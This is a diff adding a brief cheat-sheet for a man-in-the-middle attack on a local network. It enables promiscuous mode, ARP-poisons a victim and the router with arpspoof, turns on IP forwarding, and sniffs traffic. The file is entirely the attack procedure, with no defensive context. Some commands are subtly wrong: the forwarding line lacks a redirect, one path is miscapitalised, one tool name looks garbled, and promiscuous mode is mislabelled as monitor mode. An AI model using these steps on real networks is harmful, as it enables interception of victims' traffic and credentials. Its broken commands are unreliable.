@@ -1,0 +1,22 @@
+BASIC MITM PROC
+----------------
+
+1) Put wireless card in monitor mode
+
+   >> ifconfig eth0 promisc
+
+2) ARP Poissoning
+
+   Shell_1: >> arpspoof -t <IP Víctima> <IP router>
+   Shell_2: >> arpspoof -t <IP router> <IP victima>
+
+3) Port forwarding
+
+   >> echo 1 /proc/sys/net/IPv4/ip_forward
+
+4) Sniff
+
+   >> dnssniff
+   >> Wireshark
+   >> ...
+   
